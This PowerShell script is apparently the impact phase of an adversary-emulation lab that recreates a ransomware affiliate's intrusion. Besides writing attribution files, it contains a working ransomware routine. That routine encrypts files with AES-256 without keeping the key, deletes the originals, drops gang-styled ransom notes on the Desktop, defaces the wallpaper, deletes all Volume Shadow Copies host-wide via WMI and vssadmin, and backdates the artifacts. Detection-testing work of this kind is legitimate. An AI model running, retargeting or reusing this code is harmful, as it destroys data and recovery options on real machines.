# ============================================================================
# BLURRING THE LINES SIM - PHASE 11: IMPACT
# ============================================================================
# The report is explicit: ransomware deployment was PREVENTED by early detection
# and response. The realized impact was successful data exfiltration (Phase 10)
# plus six days of persistent access across the beachhead, DC, file server and
# backup server, and the study's central finding - ONE affiliate used tooling
# from THREE ransomware gangs (Play, RansomHub, DragonForce).
#
# DEFAULT: no encryption (faithful to "prevented"). Pass -DeployRansomware to
# also detonate a REAL, sandbox-scoped ransomware impact - "what if it had NOT
# been stopped". Encryption is hard-scoped to the sim's own VictimFiles/Staging
# folders and refuses to run anywhere else. -RansomFamily picks which of the
# three gangs' artifacts to emulate (extension + ransom note): the box actually
# carried the RansomHub Betruger backdoor and RansomHub staging TTP, so
# RansomHub is the default.
# MITRE: T1657 Financial Theft (exfil); with -DeployRansomware also T1486 Data
#        Encrypted for Impact, T1490 Inhibit System Recovery, T1491.001 Defacement
# ============================================================================

function Simulate-Impact {
    param(
        $SimPaths,
        [switch]$DeployRansomware,
        [ValidateSet('RansomHub','Play','DragonForce')]
        [string]$RansomFamily = 'RansomHub'
    )

    if ($DeployRansomware) {
        Write-Host "[+] Phase 11: Impact - exfiltration + REAL $RansomFamily encryption (sandbox-scoped) ..." -ForegroundColor Green
    } else {
        Write-Host "[+] Phase 11: Impact - exfiltration + 3-gang attribution (NO ransomware) ..." -ForegroundColor Green
    }

    # --- "Blurring lines" OPSEC artifact: prior DragonForce victim NetScan file --
    $priorVictim = "$($SimPaths.PublicMusic)\netscan_prev.txt"
    Set-Content -Path $priorVictim -Value @"
[SoftPerfect NetScan results - recovered from operator tooling, BlurringLinesSim]
NOTE: this scan output is NOT from this victim. It references hosts from a
different company reportedly compromised by DragonForce ransomware - an operator
OPSEC failure that ties this affiliate to a prior DragonForce intrusion.
10.42.7.11    DC-DF01     445/open 3389/open
10.42.7.24    SQL-DF02    445/open 1433/open
10.42.7.50    FILE-DF03   445/open
"@ -Force
    Write-SimEvent -EventId 11001 -Message "SIMULATION: prior-victim NetScan file recovered referencing a DragonForce-compromised company (attribution overlap)"

    # --- Three-gang attribution mapping --------------------------------------
    $mapping = @"
=== BLURRING THE LINES - THREE-GANG TOOLING OVERLAP ===
One affiliate, tooling attributed across three ransomware operations:

 Tool / TTP                                   | Attributed group
 ---------------------------------------------|----------------------------
 Grixba recon (GT_NET.exe, GRB_NET.exe)       | Play
 SystemBC proxy (WakeWordEngine/conhost.dll)  | Play + DragonForce
 Betruger backdoor (ccs.exe)                  | RansomHub
 C:\Users\Public\Music staging pattern        | RansomHub
 Prior NetScan victim file (netscan_prev.txt) | DragonForce
 Impacket / NetScan / AdFind / WinRAR / PsExec| shared post-exploitation kit

Assessment: most likely a single affiliate operating across Play, RansomHub and
DragonForce - the "blurring lines" between otherwise distinct gangs.
"@
    Set-Content -Path "$($SimPaths.VictimFiles)\_THREE_GANG_ATTRIBUTION.txt" -Value $mapping -Force

    # --- Optional: REAL sandbox-scoped ransomware detonation ------------------
    $ransomInfo = $null
    if ($DeployRansomware) {
        $ransomInfo = Invoke-RansomwareImpact -SimPaths $SimPaths -Family $RansomFamily
    }

    # --- Impact summary (conditional on whether encryption ran) ---------------
    if ($DeployRansomware -and $ransomInfo) {
        $summary = @"
=== BLURRING THE LINES INTRUSION - IMPACT SUMMARY (RANSOMWARE DETONATED) ===
Mode:           -DeployRansomware set. In the REAL case encryption was PREVENTED;
                this run shows the "if it had not been stopped" outcome.
Ransomware:     $RansomFamily emulated. $($ransomInfo.Files) files encrypted
                (extension '$($ransomInfo.Ext)'), scoped ONLY to the sim's
                VictimFiles/Staging folders. Ransom note: $($ransomInfo.NoteName).
Recovery:       Volume Shadow Copies deleted (T1490); wallpaper defaced (T1491.001).
Exfiltration:   Day 2, ~15 min, WinSCP over clear-text FTP to 144.202.61[.]209.
Access:         Beachhead workstation, domain controller, file server, backup.
Attribution:    Single affiliate, tooling from Play + RansomHub + DragonForce.
"@
    } else {
        $summary = @"
=== BLURRING THE LINES INTRUSION - IMPACT SUMMARY ===
Outcome:        Data exfiltration + 6 days of persistent, multi-host access.
Ransomware:     NONE deployed. Encryption was PREVENTED by early detection and
                response. (Re-run with -DeployRansomware to detonate a real,
                sandbox-scoped $RansomFamily encryption for detection testing.)
Dwell time:     ~6 days (Day 1 initial access -> Day 6 Betruger -> eviction).
Exfiltration:   Day 2, ~15 min, WinSCP over clear-text FTP to 144.202.61[.]209.
Access:         Beachhead workstation, domain controller, file server, backup.
Attribution:    Single affiliate, tooling from Play + RansomHub + DragonForce.

For the analyst: investigative value is the LAYERED tool overlap and the
credential-theft -> lateral-movement -> exfiltration chain, not an encryption
event. The three-gang overlap is summarized in _THREE_GANG_ATTRIBUTION.txt.
"@
    }
    Set-Content -Path "$($SimPaths.VictimFiles)\_INTRUSION_IMPACT_SUMMARY.txt" -Value $summary -Force
    Write-SimEvent -EventId 11002 -Message "SIMULATION: Impact recorded (DeployRansomware=$([bool]$DeployRansomware), Family=$RansomFamily); affiliate links Play/RansomHub/DragonForce"

    Write-Host "  [OK] Impact marker written$(if($DeployRansomware){' + real sandbox-scoped encryption'}else{' (no encryption performed)'})" -ForegroundColor Yellow
}

function Invoke-RansomwareImpact {
    <#
        Performs a REAL AES-256 encryption pass, ransom-note drop, wallpaper
        defacement and Volume Shadow Copy deletion - the "if it had not been
        stopped" outcome. HARD-SCOPED to $SimPaths.VictimFiles and
        $SimPaths.Staging (both under the sim root); it refuses to touch any path
        outside the sim root. -Family selects the gang whose extension + note are
        emulated (RansomHub default, or Play / DragonForce).

        SAFETY: never repoint the target list at real data. Encryption is confined
        to the sim's sandbox folders by an explicit under-sim-root guard.
    #>
    param(
        [Parameter(Mandatory)]$SimPaths,
        [ValidateSet('RansomHub','Play','DragonForce')][string]$Family = 'RansomHub'
    )

    Write-Host "    [!] -DeployRansomware: detonating REAL $Family encryption in the sandbox ..." -ForegroundColor Red

    # --- Per-family artifact profile (extension + note filename + note body) ---
    $ext6 = -join ((48..57) + (97..102) | Get-Random -Count 6 | ForEach-Object { [char]$_ })  # 6-hex, RansomHub style
    $profiles = @{
        RansomHub = @{
            Ext      = ".$ext6"
            NoteName = "README_$ext6.txt"
            Body     = @"
Hello!

Your network has been breached by the RansomHub team. All important files on
your systems have been ENCRYPTED and a copy of your sensitive data has been
downloaded.

To recover your files and prevent publication on our leak blog:
  1. Download the Tor Browser (https://www.torproject.org)
  2. Open our chat portal: http://ransomhub[redacted-for-simulation].onion
  3. Log in with your personal ID: $ext6-$($env:COMPUTERNAME)

Do NOT rename or modify encrypted files. Do NOT use third-party decryptors -
you will lose your data permanently.
"@
        }
        Play = @{
            Ext      = ".play"
            NoteName = "ReadMe.txt"
            Body     = @"
PLAY

Your files are encrypted and your confidential data has been copied.
To restore your data and avoid publication, contact us by email.

  Contact: recovery-$ext6@gmx.com
  Subject: $($env:COMPUTERNAME)

[redacted-for-simulation]
"@
        }
        DragonForce = @{
            Ext      = ".dragonforce"
            NoteName = "readme.txt"
            Body     = @"
                    >>> DragonForce <<<

Your systems have been encrypted and your data exfiltrated.

Contact us through our secure onion portal to negotiate recovery and prevent
your data from being published:
  http://dragonforce[redacted-for-simulation].onion
  Access token: $ext6-$($env:COMPUTERNAME)

Any attempt to decrypt files with third-party tools will corrupt them.
"@
        }
    }
    $p = $profiles[$Family]
    $encExt = $p.Ext

    # --- Under-sim-root guard: only encrypt inside the sandbox ----------------
    $simRoot = [System.IO.Path]::GetFullPath($SimPaths.Root).TrimEnd('\')
    $targets = @($SimPaths.VictimFiles, $SimPaths.Staging) | Where-Object {
        $full = try { [System.IO.Path]::GetFullPath($_) } catch { $null }
        $full -and $full.TrimEnd('\').ToLower().StartsWith($simRoot.ToLower())
    }
    if (-not $targets) {
        Write-Warning "Ransomware impact aborted: no target folder resolved under the sim root ($simRoot). Nothing encrypted."
        return $null
    }

    # Make sure there is data to encrypt (Phase 10 seeds VictimFiles; add more).
    1..6 | ForEach-Object {
        $f = Join-Path $SimPaths.VictimFiles ("business_record_{0}.txt" -f $_)
        if (-not (Test-Path $f)) { Set-Content -Path $f -Value ("Lab victim record #{0} (BlurringLinesSim)" -f $_) -Force }
    }

    # --- REAL AES-256 encryption pass -----------------------------------------
    $aesKey = New-Object byte[] 32
    $aesIv  = New-Object byte[] 16
    [System.Security.Cryptography.RandomNumberGenerator]::Create().GetBytes($aesKey)
    [System.Security.Cryptography.RandomNumberGenerator]::Create().GetBytes($aesIv)
    $aes = [System.Security.Cryptography.Aes]::Create()
    $aes.Key = $aesKey; $aes.IV = $aesIv

    $count = 0
    foreach ($targetDir in $targets) {
        Get-ChildItem -Path $targetDir -File -Recurse -ErrorAction SilentlyContinue |
            Where-Object { $_.Extension -ne $encExt -and $_.Name -ne $p.NoteName -and $_.Name -notlike "_*.txt" } |
            ForEach-Object {
                try {
                    $bytes = [System.IO.File]::ReadAllBytes($_.FullName)
                    $pad = 16 - ($bytes.Length % 16); if ($pad -eq 16) { $pad = 0 }
                    if ($pad -gt 0) { $bytes += (New-Object byte[] $pad) }
                    $encryptor = $aes.CreateEncryptor()
                    $encBytes = if ($bytes.Length -gt 0) { $encryptor.TransformFinalBlock($bytes, 0, $bytes.Length) } else { $bytes }
                    [System.IO.File]::WriteAllBytes("$($_.FullName)$encExt", $encBytes)
                    Remove-Item -Path $_.FullName -Force
                    $count++
                } catch { Write-Warning "Encrypt failed for $($_.Name): $($_.Exception.Message)" }
            }
    }
    $aes.Dispose()
    Write-SimEvent -EventId 11003 -Message "SIMULATION: $Family AES-256 encrypted $count sandboxed files (extension '$encExt') across VictimFiles/Staging (T1486)"

    # --- Ransom note in each sandbox folder + Desktop -------------------------
    $noteLocations = @(
        "$($SimPaths.Root)\$($p.NoteName)",
        "$([Environment]::GetFolderPath('Desktop'))\$($p.NoteName)",
        "$($SimPaths.VictimFiles)\$($p.NoteName)",
        "$($SimPaths.Staging)\$($p.NoteName)"
    )
    foreach ($n in $noteLocations) { try { Set-Content -Path $n -Value $p.Body -Force } catch {} }
    Write-SimEvent -EventId 11004 -Message "SIMULATION: $Family ransom note '$($p.NoteName)' dropped in sandbox folders + Desktop (T1486)"

    # --- Desktop wallpaper defacement (real, cosmetic, reversible) ------------
    # Set env BLURRINGLINESSIM_SKIP_WALLPAPER=1 to log-only instead.
    $wallpaperImg = "$($SimPaths.Root)\ransom_wallpaper.bmp"
    if ($env:BLURRINGLINESSIM_SKIP_WALLPAPER -eq "1") {
        Set-Content -Path "$($SimPaths.Logs)\wallpaper_change.log" `
            -Value "[SIMULATION] Wallpaper change skipped (BLURRINGLINESSIM_SKIP_WALLPAPER=1)." -Force
    } else {
        try {
            Add-Type -AssemblyName System.Drawing
            $bmp = New-Object System.Drawing.Bitmap 1024, 768
            $g = [System.Drawing.Graphics]::FromImage($bmp)
            $g.Clear([System.Drawing.Color]::Black)
            $font = New-Object System.Drawing.Font "Consolas", 20, ([System.Drawing.FontStyle]::Bold)
            $g.DrawString("$Family - Your files are encrypted.`nSee $($p.NoteName)", $font, [System.Drawing.Brushes]::Red, 40, 40)
            $g.Dispose()
            $bmp.Save($wallpaperImg, [System.Drawing.Imaging.ImageFormat]::Bmp)
            $bmp.Dispose()
            if (-not ("BlWallpaper" -as [type])) {
                Add-Type -TypeDefinition @"
using System.Runtime.InteropServices;
public class BlWallpaper {
    [DllImport("user32.dll", CharSet = CharSet.Auto)]
    public static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);
}
"@ -ErrorAction SilentlyContinue
            }
            [BlWallpaper]::SystemParametersInfo(20, 0, $wallpaperImg, 3) | Out-Null   # SPI_SETDESKWALLPAPER
            Set-Content -Path "$($SimPaths.Logs)\wallpaper_change.log" -Value "[SIMULATION] Real (cosmetic) wallpaper set to $wallpaperImg" -Force
        } catch { Write-Warning "Wallpaper change failed (headless/session-0?): $($_.Exception.Message)" }
    }
    Write-SimEvent -EventId 11005 -Message "SIMULATION: desktop wallpaper defaced with $Family ransom notification (T1491.001)"

    # --- REAL Volume Shadow Copy deletion via WMI (Inhibit System Recovery) ---
    try {
        & powershell.exe -NoProfile -Command "Get-WmiObject Win32_Shadowcopy | Remove-WmiObject" 2>$null
        # Also the classic vssadmin/wmic command-line artifact ransomware leaves
        & cmd.exe /c "vssadmin delete shadows /all /quiet" 2>$null | Out-Null
        Write-SimEvent -EventId 11006 -Message "SIMULATION: Volume Shadow Copies deleted (WMI + vssadmin) (T1490 Inhibit System Recovery)"
    } catch { Write-Warning "VSS deletion failed: $($_.Exception.Message)" }

    # --- Backdate impact artifacts into Day 6 (deployment end) ----------------
    $impactArtifacts = @($wallpaperImg) + $noteLocations
    foreach ($tgt in @($SimPaths.VictimFiles, $SimPaths.Staging)) {
        Get-ChildItem -Path $tgt -File -ErrorAction SilentlyContinue | ForEach-Object { $impactArtifacts += $_.FullName }
    }
    foreach ($a in ($impactArtifacts | Select-Object -Unique)) {
        Set-ArtifactTimestamp -Path $a -Anchor $Global:BlurTimeline.Day6 -JitterMinutes 120
    }

    Write-Host "    [OK] $Family encryption complete: $count files -> '$encExt', note '$($p.NoteName)', VSS deleted, wallpaper set" -ForegroundColor Yellow
    return @{ Ext = $encExt; NoteName = $p.NoteName; Files = $count }
}
